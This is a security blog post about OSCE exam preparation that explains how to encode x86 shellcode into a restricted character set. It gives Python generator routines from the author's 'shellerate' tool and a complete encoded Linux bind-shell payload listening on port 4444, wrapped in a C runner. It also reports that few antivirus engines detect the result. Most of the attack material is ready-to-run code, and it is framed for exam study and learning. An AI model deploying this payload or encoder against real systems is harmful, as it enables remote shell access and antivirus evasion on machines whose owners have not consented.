---
title: A tale of a restricted charset shellcode generation
url: https://armoredcode.com/blog/a-tale-of-a-restricted-charset-shellcode-generation/
source: Over Security
date: 2026-05-28
fetch_date: 2026-05-29T06:06:07.642661
---

# A tale of a restricted charset shellcode generation

[Armored Code](/)

[Blog](/blog/)
[Newsletter](https://mailchi.mp/a61f93445c94/armored-code-newsletter)

# A tale of a restricted charset shellcode generation

April 2019

During my OSCE exam preparation I had to deal with shellcode writing experience
where very few allower characters were available.

This brilliant talk by [@muts](https://twitter.com/muts), lead us to get in
touch with a new encoding technique. When you can’t directly write words on the
stack, due to bad characters, you can eventually let a register to contained
the desired word and then push the register into the stack.

As you can see from the video taken at Defcon 16, the code exploits the fact
that after the shellcode it has been written into the stack, very close to the
encoded payload, the execution flow continues until the decoded shellcode it
has been found.

Boom.

All the magic happens in two different pieces.

## Init a register to 0

We can’t use XOR to init a register to zero. So we use math here and some
AND property to apply to reset all bits in our register.

On
[shellerate](https://github.com/thesp0nge/shellerate/blob/master/shellerate/asm_x86.py)
I created a zero\_with\_and routine. The basic idea is to get a random 32 bits
value, calculating its NOT and then build the shellcode. When the register it
has been put in AND with those two values, it will be set to zero.

```
  def zero_with_and(reg="eax", badchar=[]):

  while True:
    first_and = secrets.token_hex(4)
    n_b = bin(int(first_and, 16))
    n_b_2 = bit_not(int(n_b, 2), 32)
    if n_b_2 > 0:
      break

  second_and = format(n_b_2, 'x').zfill(8)

  logging.debug("First AND: %s" % first_and)
  logging.debug("Second AND: %s" % second_and)

  first_and_hex = strings.from_string_to_payload(strings.swap(first_and))
  second_and_hex = strings.from_string_to_payload(strings.swap(second_and))

  if reg == "eax":
    return "\\x25"+first_and_hex+"\\x25"+second_and_hex

  if reg == "ebx":
    return "\\xb1\\xe3"+first_and_hex+"\\xb1\\xe3"+second_and_hex
  if reg == "ebx":
    return "\\xb1\\xe3"+first_and_hex+"\\xb1\\xe3"+second_and_hex
  if reg == "ecx":
    return "\\xb1\\xe1"+first_and_hex+"\\xb1\\xe1"+second_and_hex
  if reg == "edx":
    return "\\xb1\\xe2"+first_and_hex+"\\xb1\\xe2"+second_and_hex
```

## Writing a word on the stack

We can’t write a word on the stack because of a restricted alphabet. We will
get rid of this by calculating the
[two-complement](https://en.wikipedia.org/wiki/Two%27s_complement) of the word
we want to write and by finding 2 or 3 values that when added will result in
our word’s complement.

Those values will be subtracted from EAX register, after it has been set to 0.
At the end, EAX will be set to the desired word and it can be pushed into the
stack.

```
  def generate_add_eax_sum_shellcode(result):
  compl_two = int("FFFFFFFF", 16) - int(result, 16) + 1

  c = find_encoded_sequence(compl_two)
  c2_h = "0x{:08x}".format(compl_two)
  f = ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*c[::-1])]
  f_sum = "0x{:08x}".format(sum([int(i, 16) for i in f]) % (2**32))

  if (c2_h != f_sum):
    logging.warning("can't find a good encoded sequence using 2 operands... trying with 3")
    c = find_encoded_sequence(compl_two, True)
    f = ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*c[::-1])]
    f_sum = "0x{:08x}".format(sum([int(i, 16) for i in f]) % (2**32))

    if(c2_h != f_sum):
      logging.error("can't find a good encoded sequence. Please consider changing this shellcode sequence" + result)
      return ""

  logging.debug("obtaining 0x{0} with this ASM sequence".format(result))
  for i in ("554e4d4a", "2a313235"):
    logging.debug("AND EAX, 0x{0}".format(i))
  for j in f:
    logging.debug("SUB EAX, 0x{0}".format(j))
  logging.debug("PUSH EAX")

  shellcode = asm_x86.zero_with_and("eax")
  for i in f:
    shellcode += "\\x2d" + strings.from_string_to_payload(strings.swap(i))
  shellcode+="\\x50"

  return shellcode
```

The whole generate.py source code is available on this gist.

```
400: Invalid request
```

## Put all the pieces together with shellerate

This can be a really good shellcode encoding mechanism. That’s why I automated
this process and integrated it with
[shellerate](https://github.com/thesp0nge/shellerate/tree/master/shellerate).

I asked my framework to generate a bind shell shellcode for Linux operating
system. The shell will listen on port 4444 for incoming connections.

Than I padded my shellcode, since I want to operate on 4 bytes long words and I
splitted my shellcode into words.

I encoded all the words using a restricted allowed charset alphabet and I
eventually appended a jump ESP call in order to use my shellcode in a C helper
like this:

```
#include<stdio.h>
#include<string.h>

unsigned char code[]="\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x02\x01\x01\x01\x2d\x7e\x6e\x6e\x6e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x32\x01\x01\x36\x2d\x7e\x01\x75\x7e\x2d\x7e\x4c\x7e\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x31\x01\x01\x01\x2d\x6e\x4e\x01\x4f\x2d\x7e\x7e\x34\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x31\x31\x31\x01\x2d\x6d\x65\x60\x75\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x31\x31\x31\x52\x2d\x5c\x66\x66\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x32\x31\x52\x52\x2d\x7e\x66\x7e\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x09\x01\x50\x01\x2d\x7e\x05\x7e\x3e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x43\x01\x01\x38\x2d\x7e\x31\x7e\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x02\x01\x01\x01\x2d\x7e\x4f\x01\x01\x2d\x7e\x7e\x3d\x4d\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x50\x01\x01\x2d\x3c\x7e\x35\x4d\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x31\x35\x01\x01\x2d\x6f\x7e\x01\x01\x2d\x7e\x7e\x7c\x74\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x36\x01\x31\x01\x2d\x7e\x01\x6f\x01\x2d\x7e\x73\x7e\x73\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x02\x01\x01\x2d\x31\x7e\x31\x01\x2d\x62\x7e\x7c\x74\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x51\x01\x31\x01\x2d\x7e\x3e\x68\x46\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x02\x36\x01\x2d\x31\x7e\x7e\x01\x2d\x63\x7e\x7e\x7c\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x51\x01\x31\x01\x2d\x7e\x3e\x68\x46\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x01\x50\x01\x2d\x32\x7e\x7e\x35\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x31\x01\x01\x2d\x01\x6f\x01\x70\x2d\x75\x7e\x4a\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x01\x01\x01\x2d\x31\x31\x31\x7e\x2d\x72\x67\x63\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x31\x31\x31\x70\x2d\x7e\x68\x66\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x02\x01\x01\x2d\x31\x7e\x4f\x01\x2d\x65\x7e\x7e\x34\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x51\x01\x31\x01\x2d\x7e\x3e\x68\x46\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x01\x01\x01\x2d\x32\x7e\x75\x3b\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x01\x01\x02\x2d\x01\x7e\x01\x7e\x2d\x4b\x7e\x4c\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x01\x01\x02\x2d\x31\x01\x31\x7e\x2d\x68\x45\x66\x7e\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x01\x01\x01\x01\x2d\x76\x3d\x75\x3c\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2d\x51\x01\x01\x01\x2d\x7e\x3e\x75\x3b\x50\xff\xe4";

int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Please note that I wrote my shellcode in a reverse order, from the last word to
the first. This way, since the stack is growing backwards, the ESP register
will point to the beginning of my decoded shellcode at the end of the process.

You can see the process in action here. As you can see, the shellcode is
working and a bind shellcode was listening on port 4444.

What about anti virus tool then? I submitted my a.out file to Virus Total and
only 3 engines out of 58 detected ...